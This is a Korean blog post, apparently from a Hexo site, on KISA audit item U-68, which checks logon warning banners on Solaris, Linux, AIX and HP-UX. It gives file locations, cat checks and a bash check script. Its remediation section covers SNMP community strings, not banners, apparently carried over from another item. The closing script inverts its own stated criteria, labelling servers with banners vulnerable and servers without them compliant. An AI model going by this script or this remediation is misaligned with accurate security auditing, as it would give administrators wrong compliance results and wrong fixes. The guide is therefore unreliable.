<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 서버 및 <code>Telnet</code> <code>FTP</code> <code>SMTP</code> <code>DNS</code> 서비스에 로그온 메시지가 설정되어  있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 서버 및 <code>Telnet</code> <code>FTP</code> <code>SMTP</code> <code>DNS</code> 서비스에 로그온 메시지가 설정되어  있는 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td>1) 서버 로그온 메시지 설정: vi 편집기로 <code>/etc/motd</code> 파일을 연 후 로그온 메시지 입력<br />    <code># vi /etc/motd</code><br />    경고 메시지 입력<br /><br />2) Telnet 배너 설정: vi 편집기로 <code>/etc/default/telnetd</code> 파일을 연 후 로그온 메시지 입력<br />    <code># vi /etc/default/telnetd</code><br />    BANNER=”WARNING:Authorized use only” or BANNER=””<br /><br />3) FTP 배너 설정: vi 편집기로 <code>/etc/default/ftpd</code> 파일을 연 후 로그인 메시지 입력<br />    <code># vi /etc/default/ftpd</code><br />    BANNER=”WARNING:Authorized use only” or BANNER=””<br /><br />4) SMTP 배너 설정: vi 편집기로 <code>/etc/mail/sendmail.cf</code> 파일을 연 후 로그인 메시지 입력<br />    <code># vi /etc/mail/sendmail.cf</code><br />    O Smtp GreetingMessage=”경고 메시지 입력”<br /><br />5) DNS 배너 설정: vi 편집기로 <code>/etc/named.conf</code> 파일을 연 후 로그인 메시지 입력<br />    <code># vi /etc/named.conf</code><br />    경고 메시지 입력</td>
</tr>
<tr>
<td>LINUX</td>
<td>1) 서버 로그온 메시지 설정: vi 편집기로 <code>/etc/motd</code> 파일을 연 후 로그온 메시지 입력<br />    <code># vi /etc/motd</code><br />    경고 메시지 입력<br /><br />2) Telnet 배너 설정: vi 편집기로 <code>/etc/issue.net</code> 파일을 연 후 로그온 메시지 입력<br />    <code># vi /etc/issue.net</code><br />    경고 메시지 입력<br /><br />3) FTP 배너 설정: vi 편집기로 <code>/etc/vsftpd/vsftpd.conf</code> 파일을 연 후 로그인 메시지 입력<br />    <code># vi /etc/vsftpd/vsftpd.conf</code><br />    ftpd_banner=”경고 메시지 입력”<br /><br />4) SMTP 배너 설정: vi 편집기로 <code>/etc/mail/sendmail.cf</code> 파일을 연 후 로그인 메시지 입력<br />    <code># vi /etc/mail/sendmail.cf</code><br />    O Smtp GreetingMessage=”경고 메시지 입력”<br /><br />5) DNS 배너 설정: vi 편집기로 <code>/etc/named.conf</code> 파일을 연 후 로그인 메시지 입력<br />    <code># vi /etc/named.conf</code><br />    경고 메시지 입력</td>
</tr>
<tr>
<td>AIX</td>
<td>1) 서버 로그온 메시지 설정: vi 편집기로 <code>/etc/motd</code> 파일을 연 후 로그온 메시지 입력<br />    <code># vi /etc/motd</code><br />    경고 메시지 입력<br /><br />2) Telnet 배너 설정: vi 편집기로 <code>/etc/security/login.cfg</code> 파일을 연 후 로그온 메시지 입력<br />    <code># vi /etc/security/lgoin.cfg</code><br />    default: 라인 끝부분에 herald=”경고 메시지” 설정 추가<br /><br />3) FTP 배너 설정<br />    <code># dspcat -g /usr/lib/nls/msg/en_US/ftpd.cat &gt; /tmp/ftpd.msg</code><br />    <code># vi /tmp/ftpd.msg</code>의 내용중 “(%s) FTP server (%s) ready.” 삭제 후 경고 메시 지 입력<br />    <code># gencat /tmp/ftpd.cat /tmp/ftpd.msg</code><br />    <code># cp -p /tmp/ftpd.cat /usr/lib/nls/msg/en_US/ftpd.cat</code><br /><br />4) SMTP 배너 설정: vi 편집기로 <code>/etc/mail/sendmail.cf</code> 파일을 연 후 로그인 메시지 입력<br />    <code># vi /etc/mail/sendmail.cf</code><br />    <code># SMTP initial login message (old $e marco)</code><br />    O SmtpGreetingMessage=”경고 메시지 입력”<br /><br />5) DNS 배너 설정: vi 편집기로 <code>/etc/named.conf</code> 파일을 연 후 로그인 메시지 입력<br />    <code># vi /etc/named.conf</code><br />    경고 메시지 입력</td>
</tr>
<tr>
<td>HP-UX</td>
<td>1) 서버 로그온 메시지 설정: vi 편집기로 <code>/etc/motd</code> 파일을 연 후 로그온 메시지 입력<br />    <code># vi /etc/motd</code><br />    경고 메시지 입력<br /><br />2) Telnet 배너 설정: vi 편집기로 <code>/etc/inetd.conf</code> 파일을 연 후 telnet 부분에 로그인 파 일 설정<br />    <code># telnet stream tcp6 nowait root /usr/lbin/telnetd telnetd –b /etc/issue</code><br />    (<code>/etc/issue</code> 파일은 banner가 작성되어 있는 파일)<br />    (-b : 뒤에 따라오는 banner 파일을 사용하겠다는 옵션)<br />    <code># vi /etc/issue</code><br />    경고 메시지 입력<br /><br />3) FTP 배너 설정: vi 편집기로 <code>/etc/inetd.conf</code> 파일을 연 후 다음 내용 추가<br />    <code># vi /etc/inetd.conf</code><br />    ftp stream tcp nowait root /usr/lbin/ftpd ftpd -a /etc/ftpd/ftpaccess<br />    (-a : 뒤에 따라오는 설정파일을 사용하겠다는 옵션)<br />    ※ hostname제거<br /><br />&lt;wu-ftpd v2.4 미만인 경우&gt;<br />    <code># vi /etc/ftpd/ftpaccess</code><br />    suppresshostname yes (hostname 숨김)<br />    suppressversion yes (version 정보 숨김)<br />    banner /etc/ftpd/ftp_banner(ftp 배너가 작성된 파일) <br /><br />&lt;wu-ftpd v2.4 이상인 경우&gt;<br />    <code># vi /etc/ftpd/ftpaccess</code><br />    greeting terse (hostname 및 version 정보 숨김)<br /><br />&lt;<code>/etc/ftpd/ftpaccess</code> 파일이 없을 경우&gt;<br />    <code># cp /usr/newconfig/etc/ftpd/examples/ftpaccess /etc/ftpd/ftpaccess</code><br /><br />4) SMTP 배너 설정: vi 편집기로 <code>/etc/mail/sendmail.cf</code> 파일을 연 후 메시지 입력<br />    <code># vi /etc/mail/sendmail.cf</code><br />    SMTP initial login message (old $e marco)<br />    O SmtpGreetingMessage=”경고 메시지 입력”<br /><br />5) DNS 배너 설정: vi 편집기로 <code>/etc/named.conf</code> 파일을 연 후 메시지 입력<br />    <code># vi /etc/named.conf</code><br />    경고 메시지 입력</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/motd</p>
<p># cat /etc/issue.net</p>
<p># cat /etc/vsftpd/vsftpd.conf | grep &quot;ftpd_banner&quot;</p>
</blockquote>
<br>

<p>로그온 메시지가 설정되어있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-68/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td>1) vi 편집기를 이용하여 <code>SNMP</code> 설정파일 열기<br /><br />2) Community String 값 설정 변경<br /><strong>&lt; SOLARIS 9 이하 버전 &gt;</strong><br /><code># vi /etc/snmp/conf/snmpd.conf</code><br />(수정 전) read-community public / write-community private<br />(수정 후) read-community &lt;변경 값&gt; / write-community &lt;변경 값&gt;<br /><br /><strong>&lt; SOLARIS 10 이상 버전 &gt;</strong><br /><code># vi /etc/sma/snmp/snmpd.conf</code><br />(수정 전) rocommunity public / rwcommunity private<br />(수정 후) rocommunity &lt;변경 값&gt; / rwcommunity &lt;변경 값&gt;<br /><br /><strong>&lt; SOLARIS 9 이하 버전 &gt;</strong><br /><code># ps -ef | grep snmp</code><br /><code># kill -HUP [PID]</code><br /><br /><strong>&lt; SOLARIS 10 이상 버전 &gt;</strong><br /><code># svcs -a | grep snmpdx</code><br /><code># svcadm disable svc:/application/management/snmpdx:default</code><br /><code># svcadm enable svc:/application/management/snmpdx:default</code></td>
</tr>
<tr>
<td>LINUX</td>
<td>1) vi 편집기를 이용하여 <code>SNMP</code> 설정파일 열기<br />    <code># vi /etc/snmp/snmpd.conf</code><br /><br />2) Community String 값 설정 변경 (추측하기 어려운 값으로 설정)<br />    (수정 전) com2sec notConfigUser default public<br />    (수정 후) com2sec notConfigUser default &lt;변경 값&gt;<br /><br />3) 서비스 재구동<br />    <code># service snmpd restart</code></td>
</tr>
<tr>
<td>AIX</td>
<td>1) vi 편집기를 이용하여 <code>SNMP</code> 설정파일 열기<br />    <code># vi /etc/snmpv3.conf</code><br /><br />2) Community String 값 설정 변경 (추측하기 어려운 값으로 설정)<br />    (수정 전) COMMUNITY public public noAuthNoPriv 0.0.0.0 0.0.0 -<br />    (수정 후) COMMUNITY &lt;변경 값&gt; &lt;변경 값&gt; noAuthNoPriv 0.0.0.0 0.0.0 -<br /><br />3) 서비스 재구동<br />    <code># ps -ef | grep snmp</code><br />    <code># kill -HUP [PID]</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>SNMP</code> 설정파일 열기<br />    <code># vi /etc/snmpd.conf</code><br /><br />2) Community String 값 설정 변경 (추측하기 어려운 값으로 설정)<br />    (수정 전) get-community-name: public / set-commnunity-name : private<br />    (수정 후) get-community-name: &lt;변경 값&gt; / set-commnunity-name: &lt;변경 값&gt;<br /><br />3) 서비스 재구동<br />    <code># ps -ef |grep snmp</code><br />    <code># kill -HUP [PID]</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/motd`</span><br><span class="line">process2=`cat /etc/issue.net`</span><br><span class="line">process3=`cat /etc/vsftpd/vsftpd.conf | grep <span class="string">&quot;ftpd_banner&quot;</span> | grep -v <span class="string">&quot;#&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ] || [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ] || [ <span class="string">&quot;<span class="variable">$process3</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-68 [로그온 시 경고 메시지 제공] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-68.txt</span><br></pre></td></tr></table></figure>

<br>

<p>로그온 시 경고 메시지 설정을 했을 경우 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-68</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-68/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
</search>
